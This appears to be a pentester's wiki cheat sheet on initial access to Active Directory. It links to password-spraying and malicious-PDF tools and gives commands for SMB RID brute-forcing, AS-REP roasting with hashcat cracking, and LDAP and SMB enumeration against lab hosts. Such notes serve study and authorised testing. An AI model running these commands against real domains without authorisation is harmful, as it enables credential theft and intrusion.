---
layout: wiki
title: Initial Access
cate1: Internals
cate2: Active Directory
description: Initial Access
keywords: Internals
---

# Initial Access

## Password Spraying
**[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
  - Checks badpwdcount attribute only in the domain policy

**Additional Resources**
  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
  - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
  - [Spray](https://github.com/Greenwolf/Spray)
  - [Hashcat Wordlists - InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)

## Rid Brute via SMB
**[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**

**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
```
nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/[DOMAIN]\\//' > users.txt
GetNPUsers.py [DOMAIN]/ -usersfile users.txt -format hashcat
hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
```

## LDAP Enumeration
**[LDAPSearch Enumeration](https://notes.benheater.com/books/active-directory/page/ldapsearch)**

```
ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts (Domain Contexts)
ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)' (Search Users)
ldapsearch -H ldap://192.168.110.55 -x -D "web_svc@painters.htb" -W -b "dc=painters,dc=htb" "(msDS-AllowedToDelegateTo=*)" msDS-AllowedToDelegateTo (Constrained Delegation)
```

**[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)**
  - Old tool however useful if Bloodhound.py isn't working as intended.

**Additional resources**
  - [Useful LDAP queries](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)

## SMB Enumeration
**[SMB - Share Enumeration](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**
```
nxc smb [IP] --shares
```

**Additional Resources**
  - [BIWasp/NetExec cheat sheet](https://github.com/BlWasp/NetExec-Cheatsheet)
  - [SMB Enumeration cheat sheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
  - [CrackMapExec + NetExec cheat sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

## Web Application Vulnerabilities
**[Bad PDF](https://github.com/deepzec/Bad-Pdf)**

**Additional Resources**
  - [Malicious PDF](https://github.com/jonaslejon/malicious-pdf)

## Integrated DNS Dump
[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)**

Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.

Additional Resources:
  - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
